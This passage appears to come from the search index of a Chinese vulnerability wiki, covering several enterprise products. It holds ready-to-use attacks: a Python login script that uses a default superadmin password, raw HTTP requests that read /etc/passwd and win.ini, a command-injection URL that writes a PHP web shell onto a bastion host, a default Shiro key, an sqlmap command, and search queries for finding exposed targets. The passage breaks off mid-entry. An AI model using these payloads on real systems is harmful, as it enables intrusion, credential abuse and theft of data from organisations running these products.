","date":"0001-01-01","objectID":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 中新网络信息安全股份有限公司中新金盾信息安全管理系统存在默认弱口令，登录身份为超级管理员 目前大部分使用的都受到了影响 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 中新金盾信息安全管理系统 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"中新金盾信息安全管理系统\" ","date":"0001-01-01","objectID":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 看到产品手册 系统默认管理员账号密码： admin/zxsoft1234!@#$ 登录页面如上，使用账号密码登录 其中泄露了大部分信息，其中包括 SMMS与FTP 及用户信息 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞利用POC ✅请求 ?q=common/getcode 时 ✅返回了验证码，通过验证码可爆破账号密码等操作 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 中新金盾信息安全管理系统 默认超级管理员密码漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"?q=common/getcode\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在获取验证码 {}?q=common/getcode ..... \\033[0m\".format(target_url)) response_data = response.headers['Set-Cookie'] check_code = re.findall(r'check_code=(.*?);', response_data)[0] PHPSESSID = re.findall(r'PHPSESSID=(.*?);', response_data)[0] print(\"\\033[36m[o] 验证码:{}\\n[o] PHPSESSID:{} \\033[0m\".format(check_code, PHPSESSID)) POC_2(target_url, check_code, PHPSESSID) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, check_code, PHPSESSID): vuln_url = target_url + \"?q=common/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"PHPSESSID={}; check_code={}\".format(PHPSESSID, check_code), \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\" } data = \"name=admin\u0026password=zxsoft1234!%40%23%24\u0026checkcode={}\u0026doLoginSubmit=1\".format(check_code) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"1\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 目标 {} 存在默认管理员弱口令 admin / zxsoft1234!@#$ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在默认管理员弱口令 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E4%B8%AD%E6%96%B0%E9%87%91%E7%9B%BE%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"中科网威 NPFW防火墙 CommandsPolling.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-npfw%E9%98%B2%E7%81%AB%E5%A2%99-commandspolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-npfw%E9%98%B2%E7%81%AB%E5%A2%99-commandspolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 中科网威 NPFW防火墙 存在任意文件读取漏洞，由于代码过滤不足，可读取服务器任意文件 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-npfw%E9%98%B2%E7%81%AB%E5%A2%99-commandspolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-npfw%E9%98%B2%E7%81%AB%E5%A2%99-commandspolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 中科网威 NPFW防火墙 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-npfw%E9%98%B2%E7%81%AB%E5%A2%99-commandspolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-npfw%E9%98%B2%E7%81%AB%E5%A2%99-commandspolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"中科网威\" \u0026\u0026 \"/direct\" ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-npfw%E9%98%B2%E7%81%AB%E5%A2%99-commandspolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-npfw%E9%98%B2%E7%81%AB%E5%A2%99-commandspolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 发送请求包 POST /direct/polling/CommandsPolling.php HTTP/1.1 Host: Cookie: PHPSESSID=014d2705856e1df139772db42ccbaf9f Content-Length: 47 Cache-Control: max-age=0 Sec-Ch-Ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Content-Type: application/x-www-form-urlencoded Connection: close command=ping\u0026filename=%2Fetc%2Fpasswd\u0026cmdParam= ","date":"0001-01-01","objectID":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-npfw%E9%98%B2%E7%81%AB%E5%A2%99-commandspolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-npfw%E9%98%B2%E7%81%AB%E5%A2%99-commandspolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iaudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iaudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 中远麒麟 iAudit堡垒机 get_luser_by_sshport.php文件存在命令拼接，攻击者通过漏洞可获取服务器权限 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iaudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iaudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 中远麒麟 iAudit堡垒机 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iaudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iaudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 cert.subject=\"Baolei\" ","date":"0001-01-01","objectID":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iaudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iaudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 出现漏洞的文件为 get_luser_by_sshport.php \u003c?php define('CAN_RUN', 1); require_once('include/global.func.php'); require_once('include/db_connect.inc.php'); if(empty($_GET['clientip'])){ echo 'no host'; return; } if(empty($_GET['clientport'])){ echo 'no port'; return; } $cmd = 'sudo perl test.pl '.$_GET['clientip'].' '.$_GET['clientport']; exec($cmd, $o, $r); $sql = \"SELECT luser FROM sessions WHERE addr='\".$_GET['clientip'].\"' and pid='\".$o[0].\"' order by sid desc limit 1\"; $rs = mysql_query($sql); $row = mysql_fetch_array($rs); echo $row['luser']; ?\u003e 其中 clientip存在命令拼接 使用 ; 分割命令就可以执行任意命令 Web目录默认为 /opt/freesvr/web/htdocs/freesvr/audit/ 发送Payload https://xxx.xxx.xxx.xxx/get_luser_by_sshport.php?clientip=1;echo+%27%3C?php%20var_dump(shell_exec($_GET[cmd]));?%3E%27%3E/opt/freesvr/web/htdocs/freesvr/audit/test.php;\u0026clientport=1 再访问写入的文件执行命令 ","date":"0001-01-01","objectID":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iaudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B8%AD%E8%BF%9C%E9%BA%92%E9%BA%9F-iaudit%E5%A0%A1%E5%9E%92%E6%9C%BA-get_luser_by_sshport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"久其财务报表 download.jsp 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 久其财务报表 download.jsp 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的信息 ","date":"0001-01-01","objectID":"/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 久其财务报表 ","date":"0001-01-01","objectID":"/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"/netrep/\" ","date":"0001-01-01","objectID":"/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录路径如下 发送请求包 POST /netrep/ebook/browse/download.jsp HTTP/1.1 Host: Content-Length: 55 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://114.251.113.53:7002 Content-Type: application/x-www-form-urlencoded jpgfilepath=c:\\windows\\win.ini ","date":"0001-01-01","objectID":"/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"云时空 社会化商业ERP系统 Shiro框架 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-shiro%E6%A1%86%E6%9E%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-shiro%E6%A1%86%E6%9E%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 云时空 社会化商业ERP为 Shiro框架 ，使用了默认的密钥导致了远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-shiro%E6%A1%86%E6%9E%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-shiro%E6%A1%86%E6%9E%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 云时空 社会化商业ERP系统 ","date":"0001-01-01","objectID":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-shiro%E6%A1%86%E6%9E%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-shiro%E6%A1%86%E6%9E%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"云时空社会化商业ERP\" ","date":"0001-01-01","objectID":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-shiro%E6%A1%86%E6%9E%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-shiro%E6%A1%86%E6%9E%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 默认密钥为 kPH+bIxk5D2deZiIxcaaaA== ","date":"0001-01-01","objectID":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-shiro%E6%A1%86%E6%9E%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-shiro%E6%A1%86%E6%9E%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"云时空 社会化商业ERP系统 validateLoginName SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-validateloginname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-validateloginname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 云时空 社会化商业ERP系统存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-validateloginname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-validateloginname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 云时空 社会化商业ERP系统 ","date":"0001-01-01","objectID":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-validateloginname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-validateloginname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"云时空社会化商业ERP\" ","date":"0001-01-01","objectID":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-validateloginname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-validateloginname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 使用SQLmap验证漏洞 sqlmap -u \"http://xxx.xxx.xxx.xxx/sys/user/validateLoginName?loginName=admin\" ","date":"0001-01-01","objectID":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-validateloginname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9Aerp%E7%B3%BB%E7%BB%9F-validateloginname-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"亿赛通 电子文档安全管理系统 dataimport 远程命令执行漏洞 